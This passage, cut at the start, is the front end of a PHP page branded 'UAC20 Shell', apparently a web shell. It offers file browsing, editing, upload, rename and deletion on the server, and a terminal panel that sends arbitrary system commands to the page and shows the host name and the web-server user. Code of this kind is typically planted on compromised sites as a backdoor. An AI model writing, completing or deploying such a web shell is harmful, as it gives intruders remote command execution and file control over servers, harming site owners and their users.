    "text" => ["fa-file-lines", "icon-text"],
    "archive" => ["fa-file-zipper", "icon-archive"],
    "pdf" => ["fa-file-pdf", "icon-pdf"],
    "video" => ["fa-file-video", "icon-other"],
    "audio" => ["fa-file-audio", "icon-other"],
    "other" => ["fa-file", "icon-other"],
  ];
  [$faClass, $iconClass] = $iconMap[$cat] ?? $iconMap["other"];

  $encodedPath = htmlspecialchars(urlencode($item["path"]), ENT_QUOTES);
  $displayPath = htmlspecialchars($item["path"], ENT_QUOTES);
  $displayName = htmlspecialchars($item["name"]);
  $ext = strtoupper(pathinfo($item["name"], PATHINFO_EXTENSION) ?: "—");
  ?>
                    <tr>
                        <td>
                            <div class="file-name-cell">
                                <span class="file-icon <?= $iconClass ?>">
                                    <i class="fa-solid <?= $faClass ?>"></i>
                                </span>
                                <?php if ($isDir): ?>
                                    <a class="file-link dir-link" href="?dir=<?= $encodedPath ?>"><?= $displayName ?></a>
                                <?php else: ?>
                                    <span class="file-link" title="<?= $displayName ?>"><?= $displayName ?></span>
                                <?php endif; ?>
                            </div>
                        </td>
                        <td><span class="cat-tag cat-<?= $cat ?>"><?= $isDir ? "DIR" : $ext ?></span></td>
                        <td class="cell-mono col-size"><?= $isDir
                          ? "&mdash;"
                          : formatBytes($item["size"]) ?></td>
                        <td class="cell-mono col-mtime"><?= date(
                          "d/m/Y H:i",
                          $item["mtime"]
                        ) ?></td>
                        <td class="col-perm">
                            <span class="perm-badge <?= $item["writable"]
                              ? "perm-write"
                              : "perm-read" ?>">
                                <i class="fa-solid fa-<?= $item["writable"]
                                  ? "lock-open"
                                  : "lock" ?> fa-xs"></i>
                                <?= $item["writable"] ? "rw" : "ro" ?>
                            </span>
                        </td>
                        <td>
                            <div class="action-group">
                                <?php if (
                                  !$isDir &&
                                  isTextEditable($item["abs"])
                                ): ?>
                                    <a href="?edit=<?= $encodedPath ?>" class="btn btn-primary btn-sm">
                                        <i class="fa-solid fa-pen"></i>
                                        <span class="btn-label">Edit</span>
                                    </a>
                                <?php endif; ?>
                                <?php if (!$isDir): ?>
                                    <a href="?action=download&path=<?= $encodedPath ?>"
                                       class="btn btn-ghost btn-sm" title="Download">
                                        <i class="fa-solid fa-download"></i>
                                    </a>
                                <?php endif; ?>
                                <button class="btn btn-outline btn-sm"
                                    onclick="openRename('<?= $displayPath ?>','<?= addslashes($item["name"]) ?>')">
                                    <i class="fa-solid fa-pen-to-square"></i>
                                    <span class="btn-label">Rename</span>
                                </button>
                                <button class="btn btn-danger btn-sm"
                                    onclick="confirmDelete('<?= $displayPath ?>','<?= addslashes($item["name"]) ?>',<?= $isDir ? "true" : "false" ?>)">
                                    <i class="fa-solid fa-trash"></i>
                                </button>
                            </div>
                        </td>
                    </tr>
<?php
}

foreach ($dirs as $item) {
  renderRow($item, true);
}
foreach ($files as $item) {
  renderRow($item, false);
}

if (empty($dirs) && empty($files)): ?>
                    <tr>
                        <td colspan="6">
                            <div class="empty-state">
                                <i class="fa-solid fa-folder-open"></i>
                                <p>This directory is empty.</p>
                            </div>
                        </td>
                    </tr>
<?php endif;
?>
                    </tbody>
                </table>
            </div>

            <?php if ($editFilePath): ?>
            <div class="editor-section">
                <div class="editor-header">
                    <i class="fa-solid fa-code" style="color:var(--red)"></i>
                    <span style="font-weight:700;font-size:.88rem">Editing</span>
                    <span class="editor-path"><?= htmlspecialchars(
                      relativePath($editFilePath)
                    ) ?></span>
                    <a href="?dir=<?= urlencode(relativePath($currentDir)) ?>"
                       class="btn btn-ghost btn-sm" style="margin-left:auto">
                        <i class="fa-solid fa-xmark"></i> Close
                    </a>
                </div>
                <form method="POST">
                    <input type="hidden" name="action" value="save_file">
                    <input type="hidden" name="path"
                           value="<?= htmlspecialchars(
                             relativePath($editFilePath),
                             ENT_QUOTES
                           ) ?>">
                    <textarea class="code-editor" name="content"
                              spellcheck="false"><?= htmlspecialchars(
                                $editFileContent
                              ) ?></textarea>
                    <div class="editor-footer">
                        <a href="?dir=<?= urlencode(
                          relativePath($currentDir)
                        ) ?>"
                           class="btn btn-ghost btn-sm">
                            <i class="fa-solid fa-xmark"></i> Cancel
                        </a>
                        <button type="submit" class="btn btn-primary btn-sm">
                            <i class="fa-solid fa-floppy-disk"></i> Save Changes
                        </button>
                    </div>
                </form>
            </div>
            <?php endif; ?>

        </div>

        <div class="tab-pane" id="tab-terminal">
            <div class="terminal-section">
                <div class="terminal-header">
                    <span class="term-dot term-dot-r"></span>
                    <span class="term-dot term-dot-y"></span>
                    <span class="term-dot term-dot-g"></span>
                    <span class="term-title"><i class="fa-solid fa-terminal" style="color:var(--red);margin-right:.3rem"></i>Terminal</span>
                    <span class="term-cwd" id="term-cwd-badge"><?= htmlspecialchars(
                      relativePath($currentDir)
                    ) ?></span>
                    <button class="term-clear-btn" onclick="clearTerm()">
                        <i class="fa-solid fa-eraser"></i> clear
                    </button>
                </div>
                <div class="term-output" id="term-output">
                    <div class="term-line info-line">UAC20 Shell — connected to <?= htmlspecialchars(
                      php_uname("n")
                    ) ?> as <?= htmlspecialchars(
   function_exists("get_current_user") ? get_current_user() : "www-data"
 ) ?>. Type any system command freely.</div>
                </div>
                <div class="term-input-row">
                    <span class="term-prompt-label" id="term-prompt">/ $ </span>
                    <div class="term-input-wrap">
                        <i class="fa-solid fa-chevron-right" style="color:var(--red);font-size:.7rem;flex-shrink:0"></i>
                        <input type="text" class="term-input" id="term-input"
                               placeholder="type any command..." autocomplete="off" autocorrect="off"
                               autocapitalize="none" spellcheck="false">
                    </div>
                    <button class="term-submit-btn" onclick="submitTerm()">
                        <i class="fa-solid fa-paper-plane"></i> Run
                    </button>
                </div>
            </div>
        </div>

    </main>
</div>


<div class="modal-overlay" id="modal-new-file">
    <div class="modal">
        <div class="modal-title"><i class="fa-solid fa-file-circle-plus"></i> Create New File</div>
        <form method="POST">
            <input type="hidden" name="action" value="create_file">
            <input type="hidden" name="dir" value="<?= htmlspecialchars(
              relativePath($currentDir),
              ENT_QUOTES
            ) ?>">
            <div class="field-group">
                <label class="field-label">Filename</label>
                <input type="text" name="name" placeholder="e.g. index.php" required>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-ghost" onclick="closeModal('modal-new-file')">Cancel</button>
                <button type="submit" class="btn btn-primary"><i class="fa-solid fa-plus"></i> Create</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="modal-new-dir">
    <div class="modal">
        <div class="modal-title"><i class="fa-solid fa-folder-plus"></i> Create New Folder</div>
        <form method="POST">
            <input type="hidden" name="action" value="create_dir">
            <input type="hidden" name="dir" value="<?= htmlspecialchars(
              relativePath($currentDir),
              ENT_QUOTES
            ) ?>">
            <div class="field-group">
                <label class="field-label">Folder Name</label>
                <input type="text" name="name" placeholder="e.g. assets" required>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-ghost" onclick="closeModal('modal-new-dir')">Cancel</button>
                <button type="submit" class="btn btn-primary"><i class="fa-solid fa-plus"></i> Create</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="modal-upload">
    <div class="modal">
        <div class="modal-title"><i class="fa-solid fa-upload"></i> Upload File</div>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="hidden" name="dir" value="<?= htmlspecialchars(
              relativePath($currentDir),
              ENT_QUOTES
            ) ?>">
            <div class="field-group">
                <label class="upload-zone" for="upload-input">
                    <input type="file" name="upload_file" id="upload-input"
                           onchange="updateUploadLabel(this)" style="display:none">
                    <div id="upload-label">
                        <i class="fa-solid fa-cloud-arrow-up"></i>
                        Click to choose a file<br>
                        <span style="font-size:.73rem">Max <?= MAX_UPLOAD_MB ?> MB</span>
                    </div>
                </label>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-ghost" onclick="closeModal('modal-upload')">Cancel</button>
                <button type="submit" class="btn btn-primary"><i class="fa-solid fa-upload"></i> Upload</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="modal-rename">
    <div class="modal">
        <div class="modal-title"><i class="fa-solid fa-pen-to-square"></i> Rename</div>
        <form method="POST">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="path" id="rename-path">
            <div class="field-group">
                <label class="field-label">New Name</label>
                <input type="text" name="new_name" id="rename-input" required>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-ghost" onclick="closeModal('modal-rename')">Cancel</button>
                <button type="submit" class="btn btn-primary"><i class="fa-solid fa-check"></i> Rename</button>
            </div>
        </form>
    </div>
</div>

<div class="modal-overlay" id="modal-delete">
    <div class="modal">
        <div class="modal-title" style="color:var(--red3)">
            <i class="fa-solid fa-triangle-exclamation"></i> Confirm Delete
        </div>
        <div class="confirm-body">
            <p>Are you sure you want to permanently delete</p>
            <p style="margin-top:.4rem"><strong id="delete-name"></strong>?</p>
            <div id="delete-dir-warn" class="warn-text" style="display:none">
                <i class="fa-solid fa-triangle-exclamation" style="margin-top:.1rem;flex-shrink:0"></i>
                <span>This folder and ALL its contents will be removed. This action cannot be undone.</span>
            </div>
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="delete">
            <input type="hidden" name="path" id="delete-path">
            <div class="modal-footer">
                <button type="button" class="btn btn-ghost" onclick="closeModal('modal-delete')">Cancel</button>
                <button type="submit" class="btn btn-danger">
                    <i class="fa-solid fa-trash"></i> Delete Permanently
                </button>
            </div>
        </form>
    </div>
</div>

<?php endif; ?>

<script>
function openModal(id) {
    document.getElementById(id).classList.add('open');
    const first = document.getElementById(id).querySelector('input[type="text"]');
    if (first) setTimeout(() => first.focus(), 80);
}

function closeModal(id) {
    document.getElementById(id).classList.remove('open');
}

document.querySelectorAll('.modal-overlay').forEach(el => {
    el.addEventListener('click', e => { if (e.target === el) el.classList.remove('open'); });
});

document.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
        document.querySelectorAll('.modal-overlay.open').forEach(m => m.classList.remove('open'));
    }
});

function openRename(path, name) {
    document.getElementById('rename-path').value  = path;
    document.getElementById('rename-input').value = name;
    openModal('modal-rename');
}

function confirmDelete(path, name, isDir) {
    document.getElementById('delete-path').value       = path;
    document.getElementById('delete-name').textContent = name;
    document.getElementById('delete-dir-warn').style.display = isDir ? 'flex' : 'none';
    openModal('modal-delete');
}

function updateUploadLabel(input) {
    if (!input.files || !input.files[0]) return;
    document.getElementById('upload-label').innerHTML =
        '<i class="fa-solid fa-file-circle-check" style="color:var(--red)"></i>' +
        '<strong>' + input.files[0].name + '</strong><br>' +
        '<span style="font-size:.73rem">Ready to upload</span>';
}

document.querySelectorAll('textarea.code-editor').forEach(ta => {
    ta.addEventListener('keydown', e => {
        if (e.key !== 'Tab') return;
        e.preventDefault();
        const s = ta.selectionStart;
        ta.value = ta.value.substring(0, s) + '    ' + ta.value.substring(ta.selectionEnd);
        ta.selectionStart = ta.selectionEnd = s + 4;
    });
});

function switchTab(id, btn) {
    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + id).classList.add('active');
    btn.classList.add('active');
    if (id === 'terminal') setTimeout(() => document.getElementById('term-input').focus(), 80);
}

const termState = {
    cwd:     '<?= addslashes($currentDir) ?>',
    history: [],
    hIdx:    -1,
    busy:    false,
};

function termAppend(text, cls) {
    const out = document.getElementById('term-output');
    if (text === '__CLEAR__') { out.innerHTML = ''; return; }
    const lines = String(text).split('\n');
    lines.forEach(line => {
        const d = document.createElement('div');
        d.className = 'term-line ' + cls;
        d.textContent = line;
        out.appendChild(d);
    });
    out.scrollTop = out.scrollHeight;
}

function updatePrompt() {
    const badge = document.getElementById('term-cwd-badge');
    const label = document.getElementById('term-prompt');
    const display = termState.cwd.replace('<?= addslashes(
      ROOT_DIR
    ) ?>', '') || '/';
    if (badge) badge.textContent = display;
    if (label) label.textContent = display + ' $ ';
}

function sendTermCmd(rawCmd) {
    if (termState.busy) return;
    const cmd = (rawCmd !== undefined) ? rawCmd : document.getElementById('term-input').value.trim();
    if (!cmd) return;

    document.getElementById('term-input').value = '';
    termState.history.unshift(cmd);
    termState.hIdx = -1;

    const display = termState.cwd.replace('<?= addslashes(
      ROOT_DIR
    ) ?>', '') || '/';
    const promptEl = document.createElement('div');
    promptEl.className = 'term-line cmd-line';
    promptEl.innerHTML = '<span class="term-prompt">' + escHtml(display) + ' $ </span>'
                       + '<span class="term-input">' + escHtml(cmd) + '</span>';
    document.getElementById('term-output').appendChild(promptEl);
    document.getElementById('term-output').scrollTop = 99999;

    if (cmd === 'clear') { termAppend('__CLEAR__', ''); return; }

    termState.busy = true;
    document.getElementById('term-input').disabled = true;

    const fd = new FormData();
    fd.append('term_cmd', cmd);
    fd.append('term_cwd', termState.cwd);

    fetch(location.href, { method: 'POST', body: fd })
        .then(r => r.json())
        .then(data => {
            if (data.output === '__CLEAR__') {
                document.getElementById('term-output').innerHTML = '';
            } else if (data.output !== '') {
                termAppend(data.output, data.isError ? 'err-line' : 'out-line');
            }
            if (data.cwd) {
                termState.cwd = data.cwd;
                updatePrompt();
            }
        })
        .catch(err => termAppend('Error: ' + err.message, 'err-line'))
        .finally(() => {
            termState.busy = false;
            document.getElementById('term-input').disabled = false;
            document.getElementById('term-input').focus();
        });
}

function submitTerm() { sendTermCmd(); }

function clearTerm() {
    document.getElementById('term-output').innerHTML = '';
}

function escHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

document.getElementById('term-input') && document.getElementById('term-input').addEventListener('keydown', e => {
    if (e.key === 'Enter') { e.preventDefault(); submitTerm(); return; }
    if (e.key === 'ArrowUp') {
        e.preventDefault();
        termState.hIdx = Math.min(termState.hIdx + 1, termState.history.length - 1);
        if (termState.history[termState.hIdx] !== undefined)
            document.getElementById('term-input').value = termState.history[termState.hIdx];
    }
    if (e.key === 'ArrowDown') {
        e.preventDefault();
        termState.hIdx = Math.max(termState.hIdx - 1, -1);
        document.getElementById('term-input').value = termState.hIdx >= 0 ? termState.history[termState.hIdx] : '';
    }
    if (e.key === 'Tab') {
        e.preventDefault();
    }
});
</script>
</body>
</html>
